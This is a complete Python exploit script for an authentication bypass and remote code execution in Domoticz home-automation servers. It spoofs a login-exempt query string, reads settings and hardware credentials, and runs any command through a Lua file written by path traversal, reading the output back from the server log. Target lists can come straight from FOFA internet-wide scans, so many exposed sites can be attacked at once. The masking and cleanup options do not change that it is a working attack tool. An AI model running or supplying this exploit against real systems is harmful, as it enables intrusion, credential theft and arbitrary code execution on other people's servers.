#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Domoticz <= 2026.3 authentication bypass leading to remote code execution (RCE): reproduction and verification script.

Vulnerability chain:
    libwebem checks the raw URI substring for login exemption, but dispatch uses the parsed param.
        ?x=?param=logincheck&type=command&param=events&evparam=create
    In 2026.3, events has no permission check, and event names do not filter ../, allowing Lua to be written by traversal into scripts/lua;
    the classic Lua engine periodically executes filenames containing _time_ (luaL_openlibs makes os/io available),
    print is redirected to the server log, and getlog can return the command output.

Usage (three input modes plus command execution):
    python Domoticz_2026.3_Auth_Bypass_RCE_repro.py http://192.0.2.1:8080
    python Domoticz_2026.3_Auth_Bypass_RCE_repro.py --file targets.txt
    python Domoticz_2026.3_Auth_Bypass_RCE_repro.py --fofa        # Read config.yaml and retrieve all pages
    python Domoticz_2026.3_Auth_Bypass_RCE_repro.py http://192.0.2.1:8080 -c id
    python Domoticz_2026.3_Auth_Bypass_RCE_repro.py --file targets.txt -c "uname -a"
        -c/--cmd CMD         Execute a command through the vulnerability and print actual stdout; defaults to id if no value is supplied
        --rce-limit N        Run a command on at most the first N confirmed VULN sites (default 1; 0 means no limit)
        --rce-wait 70        Seconds to wait for the time script to run (default 70)
        --out result.json    Save per-site results (optional)
        --timeout 15         Per-request timeout in seconds

Behavior (default versus -c/--cmd):
    * Default (without -c): only verify configuration disclosure: control getsettings (expected 401),
      bypass getsettings, and bypass gethardware; print real fields with sensitive values masked.
      Two or three read-only GET requests per site; no data is written.
    * -c/--cmd: run an arbitrary command on a site where the bypass has been confirmed:
        1) Create a randomly named event name=../../lua/ncc_time_<rand> with Lua code that
           reads stdout using io.popen('<cmd>'), prints it, then deletes its own script with os.remove;
        2) wait for the time script to run; use getlog to read LUA: lines and print actual stdout;
        3) delete the event with evparam=delete, then list events to verify no residue (cleanup in finally).
      Hard limit of 10 requests per site (three configuration checks plus seven command-execution requests).
    * Suggested harmless verification commands (id / whoami / hostname / uname -a / pwd, etc.)
      are not enforced; -c accepts a user-supplied command. Ensure that the command is not destructive.
    * Side effects (disclosed): create/delete triggers LoadEvents() to rebuild
      scripts/dzVents/generated_scripts (normal save process; contents come from the database);
      the target log gains LUA: lines (read-only log; cannot be removed remotely).
      The probe does not read domoticz.db or modify devices, scenes, hardware, users, or configuration.

Uses only the Python 3 standard library; passwords, keys, hashes, and internal network ranges are masked in printed and saved results.
"""

import argparse
import base64
import hashlib
import http.client
import json
import re
import secrets
import ssl
import sys
import threading
import time
import urllib.parse
from pathlib import Path

FOFA_QUERY = 'title="Domoticz"'
BYPASS_MARK = "x=?param=logincheck"          # Must be the first query parameter; keep ? and = in the value literal
PATH_SETTINGS_BYPASS = "/json.htm?%s&type=command&param=getsettings" % BYPASS_MARK
PATH_SETTINGS_PLAIN = "/json.htm?type=command&param=getsettings"
PATH_HARDWARE_BYPASS = "/json.htm?%s&type=command&param=gethardware" % BYPASS_MARK
PATH_EVENTS_LIST = "/json.htm?%s&type=command&param=events&evparam=list" % BYPASS_MARK
PATH_GETLOG = ("/json.htm?%s&type=command&param=getlog&loglevel=268435455" % BYPASS_MARK)
MARKER = "NCCPROBE"
BEGIN_MARK = MARKER + "_BEGIN"
END_MARK = MARKER + "_END"
MAX_REQUESTS_PER_SITE = 10                  # Three configuration checks plus seven command-execution requests; hard limit
DEFAULT_CMD = "id"
# Suggested harmless verification commands; the script does not enforce an allowlist, and -c accepts any user-supplied command.
SAFE_CMDS = ("id", "whoami", "hostname", "uname -a", "pwd", "echo " + MARKER)

PRINT_LOCK = threading.Lock()
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

SECRET_FIELDS = (
    "EmailPassword", "EmailUsername", "EmailServer", "EmailFrom", "EmailPort",
    "PushoverAPI", "PushoverUser", "PushbulletAPI", "ProwlAPI", "TelegramToken",
    "PushalotAPI", "SecPassword", "ProtectionPassword", "WebLocalNetworks",
    "WebAllowedCORSOrigins", "Location",
)
EMPTY_MD5 = "d41d8cd98f00b204e9800998ecf8427e"


def _root():
    p = Path(__file__).resolve()
    for parent in p.parents:
        if (parent / "config.yaml").exists():
            return parent
    return p.parent


ROOT = _root()


# ---------------------------------------------------------------- masking


def mask_secret(v, head=2, tail=2):
    return "" if v is None or str(v) == "" else "<redacted>"


def mask_net(v):
    return "" if v is None or str(v) == "" else "<redacted-network>"


def mask_value(key, v):
    if v is None or str(v) == "":
        return ""
    if key in ("Type", "Enabled"):
        return str(v)
    if key in ("Address", "Location", "WebLocalNetworks"):
        return mask_net(v)
    return mask_secret(v)


def mask_url(u):
    return "target-" + hashlib.sha256(str(u).encode("utf-8")).hexdigest()[:12]


# ---------------------------------------------------------------- HTTP


def _split_base(base):
    m = re.match(r"^(https?)://([^/:]+)(?::(\d+))?(?:/.*)?$", base.strip(), re.I)
    if not m:
        raise ValueError("bad url: %s" % base)
    scheme = m.group(1).lower()
    host = m.group(2)
    port = int(m.group(3)) if m.group(3) else (443 if scheme == "https" else 80)
    return scheme, host, port


def http_get(base, path, timeout=15):
    """Send a request with the raw path; keep ? and = literal to avoid client re-encoding."""
    scheme, host, port = _split_base(base)
    if scheme == "https":
        conn = http.client.HTTPSConnection(host, port, timeout=timeout, context=CTX)
    else:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
    try:
        conn.request("GET", path, headers={
            "Host": host if port in (80, 443) else "%s:%d" % (host, port),
            "User-Agent": "Mozilla/5.0",
            "Accept": "*/*",
            "Connection": "close",
        })
        resp = conn.getresponse()
        body = resp.read()
        return {"status": resp.status, "len": len(body), "body": body, "error": ""}
    except Exception as e:                                  # noqa: BLE001
        return {"status": None, "len": 0, "body": b"", "error": "%s: %s" % (type(e).__name__, e)}
    finally:
        try:
            conn.close()
        except Exception:                                   # noqa: BLE001
            pass


def _json(body):
    try:
        return json.loads(body.decode("utf-8", "replace"))
    except Exception:                                       # noqa: BLE001
        return None


def _base(u):
    u = (u or "").strip()
    if not u:
        return ""
    if not re.match(r"^https?://", u, re.I):
        u = "http://" + u
    return u.rstrip("/")


def _mk_url(ip, port, host):
    """Convert a FOFA (ip, port, host) tuple to a normalized URL; host may include a scheme or port."""
    host = (host or "").strip()
    port = str(port or "").strip()
    https_ports = ("443", "4433", "4443", "4444", "7443", "8443", "9443", "10443")
    if host:
        h = host
        if re.match(r"^https?://", h, re.I):
            scheme, rest = h.split("://", 1)
        else:
            scheme, rest = "", h
        rest = rest.split("/", 1)[0]
        if ":" in rest and not rest.startswith("["):
            _, _, p = rest.rpartition(":")
            if p.isdigit():
                return "%s://%s" % (scheme or ("https" if p in https_ports else "http"), rest)
        if not scheme:
            scheme = "https" if port in https_ports else "http"
        if port:
            return "%s://%s:%s" % (scheme, rest, port)
        return "%s://%s" % (scheme, rest)
    scheme = "https" if port in https_ports else "http"
    return "%s://%s:%s" % (scheme, ip, port) if port else "%s://%s" % (scheme, ip)


# ---------------------------------------------------------------- FOFA


def load_fofa_keys():
    """Read the fofa / fofa_bak1 sections of config.yaml with a minimal parser; no PyYAML dependency."""
    keys = []
    try:
        text = (ROOT / "config.yaml").read_text(encoding="utf-8")
    except Exception:                                       # noqa: BLE001
        return keys
    section, cur = None, {}
    for raw in text.splitlines():
        line = raw.split("#", 1)[0].rstrip()
        if not line.strip():
            continue
        if not line.startswith((" ", "\t")):
            if section in ("fofa", "fofa_bak1") and cur.get("email") and cur.get("key"):
                keys.append((cur["email"], cur["key"]))
            cur = {}
            section = line.split(":", 1)[0].strip() if ":" in line else None
            continue
        if section not in ("fofa", "fofa_bak1") or ":" not in line:
            continue
        k, v = line.split(":", 1)
        k = k.strip()
        v = v.strip().strip('"').strip("'")
        if k in ("email", "key"):
            cur[k] = v
    if section in ("fofa", "fofa_bak1") and cur.get("email") and cur.get("key"):
        keys.append((cur["email"], cur["key"]))
    return keys


def _fofa_page(email, key, q, page, size=100, retries=4):
    qb = base64.b64encode(q.encode()).decode()
    path = ("/api/v1/search/all?email=%s&key=%s&qbase64=%s&page=%d&size=%d&fields=ip,port,host"
            % (email, key, qb, page, size))
    last = ""
    for attempt in range(retries):
        conn = http.client.HTTPSConnection("fofa.info", 443, timeout=40, context=CTX)
        try:
            conn.request("GET", path, headers={"User-Agent": "Mozilla/5.0", "Connection": "close"})
            resp = conn.getresponse()
            data = json.loads(resp.read().decode("utf-8", "replace"))
            if data.get("error"):
                raise RuntimeError("FOFA error: %s" % data.get("errmsg"))
            return data
        except Exception as e:                              # noqa: BLE001
            last = "%s: %s" % (type(e).__name__, e)
            time.sleep(min(2 ** attempt, 8))
        finally:
            try:
                conn.close()
            except Exception:                               # noqa: BLE001
                pass
    raise RuntimeError("FOFA retries exhausted (page %d): %s" % (page, last))


def fofa_targets(keys, size=100, max_pages=100):
    """Fetch all pages and deduplicate URLs; use the backup key if the primary key fails."""
    seen, out, last = set(), [], ""
    for email, key in keys:
        page, total = 1, 0
        try:
            while page <= max_pages:
                data = _fofa_page(email, key, FOFA_QUERY, page, size)
                total = data.get("total") or data.get("size") or total or 0
                rows = data.get("results") or []
                if not rows:
                    break
                for row in rows:
                    if not isinstance(row, (list, tuple)) or len(row) < 2:
                        continue
                    ip = str(row[0]).strip()
                    port = str(row[1]).strip()
                    host = str(row[2]).strip() if len(row) > 2 else ""
                    u = _mk_url(ip, port, host)
                    if u and u not in seen:
                        seen.add(u)
                        out.append(u)
                if len(rows) < size or page * size >= total:
                    break
                page += 1
        except Exception as e:                              # noqa: BLE001
            last = "%s: %s" % (type(e).__name__, e)
            print("[FOFA] key %s retrieval failed: %s" % (email, last), file=sys.stderr, flush=True)
            continue
        print("[FOFA] query=%s total=%s unique_targets=%d" % (FOFA_QUERY, total, len(out)),
              flush=True)
        if out:
            break
    if not out:
        raise RuntimeError("FOFA returned no targets: %s" % (last or "empty result"))
    return out


# ---------------------------------------------------------------- config probe


def _settings_fields(obj):
    if not isinstance(obj, dict):
        return {}
    out = {}
    for k in SECRET_FIELDS:
        v = obj.get(k)
        if isinstance(v, (str, int, float)) and str(v).strip():
            out[k] = str(v)
    return out


def _hw_fields(obj):
    res = []
    if not isinstance(obj, list):
        return res
    for item in obj[:3]:
        if not isinstance(item, dict):
            continue
        row = {}
        for k in ("Name", "Type", "Address", "Port", "Username", "Password",
                  "Extra", "Enabled"):
            v = item.get(k)
            if isinstance(v, (str, int, float)) and str(v).strip():
                row[k] = str(v)
        if row:
            res.append(row)
    return res


def check_site(base, timeout=15):
    """Verify configuration disclosure on one site using at most three read-only requests."""
    out = {"url": mask_url(base), "requests": 0, "steps": []}

    plain = http_get(base, PATH_SETTINGS_PLAIN, timeout)
    out["requests"] += 1
    out["steps"].append({"step": "getsettings(control)", "status": plain["status"],
                         "len": plain["len"]})

    byp = http_get(base, PATH_SETTINGS_BYPASS, timeout)
    out["requests"] += 1
    obj = _json(byp["body"])
    fields = _settings_fields(obj)
    out["steps"].append({"step": "getsettings(bypass)", "status": byp["status"],
                         "len": byp["len"]})

    if byp["status"] != 200 or not isinstance(obj, dict) or obj.get("status") == "ERR":
        out["verdict"] = "NOT_VULN"
        out["reason"] = ("auth_401" if byp["status"] in (401, 403)
                         else ("err_status" if isinstance(obj, dict)
                               and obj.get("status") == "ERR" else "no_json"))
        return out

    title = obj.get("title") or ""
    if title.lower() != "settings" and not fields:
        out["verdict"] = "NOT_VULN"
        out["reason"] = "unexpected_json"
        return out

    out["mode"] = "anonymous_getsettings" if plain["status"] == 200 else "auth_bypass"

    hw_rows = []
    hw = http_get(base, PATH_HARDWARE_BYPASS, timeout)
    out["requests"] += 1
    out["steps"].append({"step": "gethardware(bypass)", "status": hw["status"],
                         "len": hw["len"]})
    if hw["status"] == 200:
        hobj = _json(hw["body"])
        hw_rows = _hw_fields((hobj or {}).get("result") if isinstance(hobj, dict) else None)

    cred_fields = [k for k in ("EmailPassword", "EmailUsername", "PushoverAPI",
                               "PushoverUser", "PushbulletAPI", "ProwlAPI", "TelegramToken")
                   if fields.get(k) and fields[k] != EMPTY_MD5]
    hw_cred = [r for r in hw_rows if r.get("Username") or r.get("Password")]
    out["verdict"] = "VULN"
    out["cred_tier"] = bool(cred_fields or hw_cred)
    out["fields"] = {k: mask_value(k, v) for k, v in fields.items()}
    out["hardware"] = [{k: mask_value(k, v) for k, v in r.items()} for r in hw_rows]
    return out


# ---------------------------------------------------------------- command execution probe


def _lua_quote(s):
    """Embed a command safely in a Lua single-quoted string."""
    s = str(s)
    return "'" + (s.replace("\\", "\\\\").replace("'", "\\'")
                  .replace("\r", "\\r").replace("\n", "\\n")) + "'"


def _lua_payload(cmd):
    # Pass the command unchanged to io.popen (executed through /bin/sh -c); BEGIN/END delimit actual stdout in the log.
    # Delete the script itself with os.remove immediately after execution; run_rce deletes the event in finally.
    return ("print('%s')\n"
            "local f=io.popen(%s); local s=f:read('*a'); print(s); f:close()\n"
            "local ok,p=pcall(function() return debug.getinfo(1,'S').source end)\n"
            "if ok and p then local r,e=os.remove(p:gsub('^@','')); "
            "print('%s '..tostring(r)..' '..tostring(e)) end\n"
            % (BEGIN_MARK, _lua_quote(cmd), END_MARK))


def _log_lines(resp):
    j = _json(resp.get("body") or b"")
    if not isinstance(j, dict):
        return []
    return [str(x.get("message", "")) for x in (j.get("result") or []) if isinstance(x, dict)]


def _strip_lua(s):
    return re.sub(r"^\s*LUA:\s?", "", s, count=1)


def _extract_stdout(lines):
    """Extract actual stdout between BEGIN and END from getlog entries; return (lines, saw BEGIN, saw END)."""
    bi = next((i for i, m in enumerate(lines) if BEGIN_MARK in m), None)
    ei = next((i for i, m in enumerate(lines) if END_MARK in m), None)
    if bi is None:
        return [], False, ""
    ordered = lines
    if ei is not None and ei < bi:                     # Logs may be newest-first; reverse to chronological order
        ordered = list(reversed(lines))
        bi, ei = ei, bi
    raw = []
    if ei == bi:
        raw.append(ordered[bi].split(BEGIN_MARK, 1)[1].split(END_MARK, 1)[0])
    else:
        tail = ordered[bi].split(BEGIN_MARK, 1)[1]
        if tail.strip():
            raw.append(tail)
        if ei is None:
            raw.extend(ordered[bi + 1:])
        else:
            raw.extend(ordered[bi + 1:ei])
            head = ordered[ei].split(END_MARK, 1)[0]
            if head.strip():
                raw.append(head)
    out = []
    for m in raw:
        for ln in str(m).replace("\r\n", "\n").replace("\r", "\n").split("\n"):
            ln = _strip_lua(ln).rstrip()
            if ln.strip():
                out.append(ln)
    return out, True, (ordered[ei] if ei is not None else "")


def _event_list(base, timeout):
    """Read the event list; return (status, [{id, name}])."""
    r = http_get(base, PATH_EVENTS_LIST, timeout)
    j = _json(r["body"])
    items = []
    if isinstance(j, dict):
        for it in (j.get("result") or []):
            if isinstance(it, dict):
                items.append({"id": str(it.get("id", "")), "name": str(it.get("name", ""))})
    return r["status"], items, r["len"]


def _delete_event(base, event_id, timeout):
    path = ("/json.htm?%s&type=command&param=events&evparam=delete&event=%s&id=%s"
            % (BYPASS_MARK, event_id, event_id))
    # Deletion rebuilds the script directory through LoadEvents(); a response read may time out, so verify afterward.
    return http_get(base, path, timeout)


def run_rce(base, cmd=DEFAULT_CMD, timeout=15, wait=70, trigger_retry_wait=60,
            max_requests=7):
    """Execute cmd through the vulnerability: create -> list -> getlog -> delete -> verify.

    No more than max_requests (default seven; ten with configuration verification); finally deletes and verifies the event.
    Lua deletes its own script using os.remove. Return a dict with stdout read back from the log.
    """
    fname = "ncc_time_" + secrets.token_hex(3)
    lua = _lua_payload(cmd)
    enc = urllib.parse.quote(lua, safe="")
    create_path = ("/json.htm?%s&type=command&param=events&evparam=create"
                   "&name=../../lua/%s&interpreter=dzVents&eventtype=All"
                   "&eventstatus=1&xml=%s" % (BYPASS_MARK, fname, enc))
    out = {"lua_name": fname, "cmd": cmd, "marker": MARKER, "requests": 0,
           "steps": [], "hits": [], "stdout": [], "rce": "NO",
           "event_deleted": False, "lua_self_deleted": False, "side_effects": [
               "create/delete rebuilds scripts/dzVents/generated_scripts through LoadEvents() (normal save process)",
               "the target log gains LUA: %s* lines (read-only log; cannot be removed remotely)" % MARKER]}
    event_id = ""

    def budget(n=1):
        return out["requests"] + n <= max_requests

    try:
        r1 = http_get(base, create_path, timeout)
        out["requests"] += 1
        j1 = _json(r1["body"])
        ok = (r1["status"] == 200 and isinstance(j1, dict) and j1.get("status") == "OK")
        out["steps"].append({"step": "create_event", "status": r1["status"], "len": r1["len"],
                             "json": j1 if isinstance(j1, dict) else None})
        if not ok:
            out["reason"] = "create_event_failed"
            return out
        event_id = str(j1.get("id") or "")

        st, items, ln = _event_list(base, timeout)
        out["requests"] += 1
        for it in items:
            if fname in it.get("name", ""):
                event_id = it.get("id", "")
                break
        out["steps"].append({"step": "list_events", "status": st, "len": ln,
                             "event_id": event_id,
                             "matched": [it for it in items if fname in it["name"]][:2]})
        if not event_id:
            out["warning"] = "Event id not obtained; automatic deletion is unavailable. Check Setup > Events manually for " + fname

        lines = []
        for attempt, delay in enumerate((wait, trigger_retry_wait), 1):
            # Reserve three requests for deletion and verification; stop retrying log reads if the budget is insufficient.
            if not budget(1 + (3 if event_id else 0)):
                break
            print("  [rce] Read log after %ss (attempt %d)" % (delay, attempt), flush=True)
            time.sleep(delay)
            r3 = http_get(base, PATH_GETLOG, max(timeout, 25))
            out["requests"] += 1
            lines = _log_lines(r3)
            stdout, begin, end_line = _extract_stdout(lines)
            hits = [m for m in lines if MARKER in m]
            out["steps"].append({"step": "getlog", "attempt": attempt, "status": r3["status"],
                                 "len": r3["len"], "entries": len(lines),
                                 "hits": hits[-8:], "stdout_lines": len(stdout)})
            if begin:
                out["stdout"] = stdout
                out["hits"] = hits[-8:]
                # BEGIN appeared, but stdout may be incomplete; wait for END on the next read.
                if stdout or end_line:
                    out["rce"] = "YES"
                    out.pop("reason", None)
                    out["lua_self_deleted"] = bool(re.search(r"\btrue\b", end_line or ""))
                    break
                out["reason"] = "lua_started_but_no_output"
        if out["rce"] != "YES" and lines:
            out["hits"] = [m for m in lines if MARKER in m][-8:]
            out.setdefault("reason", "no_lua_output_in_log")
    finally:
        # On success, exception, or timeout, delete the event and verify that no record remains.
        if event_id:
            remain = [{"id": event_id, "name": fname}]
            if budget(1):
                r4 = _delete_event(base, event_id, timeout)
                out["requests"] += 1
                out["steps"].append({"step": "delete_event", "status": r4["status"],
                                     "len": r4["len"], "error": r4.get("error", ""),
                                     "note": "Response read timed out; treated as executed and verified afterward"
                                             if r4["status"] is None else ""})
                time.sleep(2)
            for attempt in (1, 2):
                if not budget(1):
                    break
                st5, items5, ln5 = _event_list(base, timeout)
                out["requests"] += 1
                remain = [it for it in items5 if fname in it["name"]]
                out["steps"].append({"step": "verify_deleted", "attempt": attempt,
                                     "status": st5, "len": ln5, "remaining": remain})
                if not remain:
                    break
                if attempt == 1 and budget(2):      # Reserve one verification request
                    _delete_event(base, event_id, timeout)
                    out["requests"] += 1
                    time.sleep(2)
            out["event_deleted"] = not remain
            if not out["event_deleted"]:
                out["warning"] = "Event remains in the list; delete it manually in Setup > Events: " + fname
    return out


# ---------------------------------------------------------------- output


def show(r):
    with PRINT_LOCK:
        print("\n" + "=" * 72)
        print("[%s] %s  (requests=%d)" % (r.get("verdict"), r.get("url"), r.get("requests", 0)))
        for st in r.get("steps") or []:
            print("  %-22s HTTP %-4s  %s bytes" % (st.get("step"), st.get("status"), st.get("len")))
        if r.get("verdict") != "VULN":
            print("  reason: %s" % r.get("reason"))
            sys.stdout.flush()
            return
        print("  mode: %s   tier: %s" % (r.get("mode"),
                                        "actual credentials" if r.get("cred_tier") else "configuration data"))
        f = r.get("fields") or {}
        for k in SECRET_FIELDS:
            if f.get(k):
                print("  %-20s %s" % (k, f[k]))
        for i, hw in enumerate(r.get("hardware") or [], 1):
            print("  hardware[%d]  %s" % (i, "  ".join("%s=%s" % (k, v) for k, v in hw.items())))

        rce = r.get("rce_result")
        if rce:
            print("  --- Command execution (-c %s) ---" % (rce.get("cmd") or DEFAULT_CMD))
            print("  lua_name: %s   rce: %s   event_deleted: %s   script_self_deleted: %s"
                  % (rce.get("lua_name"), rce.get("rce"),
                     rce.get("event_deleted"), rce.get("lua_self_deleted")))
            if rce.get("rce") != "SKIPPED":
                print("  --- Actual stdout ---")
                if rce.get("stdout"):
                    for line in rce["stdout"]:
                        print(line)
                else:
                    print("  (No command output captured)")
            for h in rce.get("hits") or []:
                print("  LOG: %s" % h.strip())
            if rce.get("reason"):
                print("  rce reason: %s" % rce["reason"])
            if rce.get("warning"):
                print("  rce warning: %s" % rce["warning"])
        sys.stdout.flush()


# ---------------------------------------------------------------- main


def main(argv=None):
    ap = argparse.ArgumentParser(
        description="Domoticz <=2026.3 authentication bypass to RCE reproduction script (default: configuration-disclosure check only)")
    ap.add_argument("url", nargs="?", help="Single target, e.g. http://192.0.2.1:8080")
    ap.add_argument("--file", help="Target-list file, one URL per line")
    ap.add_argument("--fofa", action="store_true", help="Fetch all FOFA pages using keys from config.yaml, then test each site")
    ap.add_argument("-c", "--cmd", nargs="?", const=DEFAULT_CMD, default=None,
                    metavar="CMD",
                    help="Execute a command through the vulnerability and print actual stdout; defaults to id when the value is omitted. "
                         "Without -c, only check configuration disclosure; quote multiword commands, e.g. -c \"uname -a\"")
    ap.add_argument("--rce-limit", type=int, default=1,
                    help="Run commands on at most the first N confirmed VULN sites (default 1; 0 means no limit)")
    ap.add_argument("--rce-wait", type=int, default=70,
                    help="Seconds to wait for the Lua time script (default 70)")
    ap.add_argument("--out", help="Save per-site results as JSON")
    ap.add_argument("--timeout", type=int, default=15)
    args = ap.parse_args(argv)

    targets = []
    if args.url:
        targets.append(_base(args.url))
    if args.file:
        for line in Path(args.file).read_text(encoding="utf-8", errors="replace").splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(_base(line))
    if args.fofa:
        keys = load_fofa_keys()
        if not keys:
            print("config.yaml has no fofa email/key", file=sys.stderr)
            return 2
        targets.extend(fofa_targets(keys))
    if not targets:
        ap.print_help()
        return 2

    seen, uniq = set(), []
    for t in targets:
        if t and t not in seen:
            seen.add(t)
            uniq.append(t)

    print("[*] %d targets; bypass form: GET /json.htm?%s&type=command&param=<command>"
          % (len(uniq), BYPASS_MARK))
    if args.cmd:
        print("[*] -c/--cmd enabled: execute command %r on confirmed VULN sites and print actual stdout; "
              "then self-delete the script, delete the event, and verify cleanup." % args.cmd)
        print("[*] Suggested harmless commands: %s (not enforced; -c accepts a custom command)."
              % ", ".join(SAFE_CMDS[:5]))
        print("[!] Side effect: create/delete triggers LoadEvents() to rebuild generated_scripts; "
              "the target log gains LUA: %s* lines." % MARKER)
    else:
        print("[*] Default mode: read-only configuration-disclosure check (getsettings/gethardware); no writes or commands. "
              "For command-execution evidence, add -c id.")

    results, rce_done = [], 0
    for t in uniq:
        try:
            r = check_site(t, timeout=args.timeout)
        except Exception as e:                              # noqa: BLE001
            r = {"url": mask_url(t), "verdict": "ERROR",
                 "reason": type(e).__name__, "requests": 0, "steps": []}
        if args.cmd and r.get("verdict") == "VULN":
            if args.rce_limit == 0 or rce_done < args.rce_limit:
                try:
                    budget = max(5, MAX_REQUESTS_PER_SITE - r.get("requests", 0))
                    r["rce_result"] = run_rce(t, cmd=args.cmd, timeout=args.timeout,
                                              wait=args.rce_wait, max_requests=budget)
                    r["requests"] += r["rce_result"].get("requests", 0)
                except Exception as e:                      # noqa: BLE001
                    r["rce_result"] = {"cmd": args.cmd, "rce": "ERROR",
                                       "reason": type(e).__name__,
                                       "requests": 0}
                rce_done += 1
            else:
                r["rce_result"] = {"cmd": args.cmd, "rce": "SKIPPED",
                                   "reason": "Over --rce-limit; command not run"}
        results.append(r)
        show(r)

    vuln = [r for r in results if r.get("verdict") == "VULN"]
    cred = [r for r in vuln if r.get("cred_tier")]
    rce_ok = [r for r in results if (r.get("rce_result") or {}).get("rce") == "YES"]
    print("\n" + "-" * 72)
    print("Summary: %d targets, %d VULN, %d with actual credentials, %d with RCE output"
          % (len(results), len(vuln), len(cred), len(rce_ok)))

    if args.out:
        Path(args.out).write_text(json.dumps({
            "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
            "bypass_marker": BYPASS_MARK,
            "fofa_query": FOFA_QUERY,
            "mode": "cmd:%s" % args.cmd if args.cmd else "config_leak_only",
            "cmd": args.cmd,
            "requests_per_site_cap": MAX_REQUESTS_PER_SITE,
            "total": len(results),
            "vuln": len(vuln),
            "vuln_cred_tier": len(cred),
            "rce_ok": len(rce_ok),
            "results": results,
        }, ensure_ascii=False, indent=1), encoding="utf-8")
        print("Saved: %s" % args.out)
    return 0


if __name__ == "__main__":
    sys.exit(main())
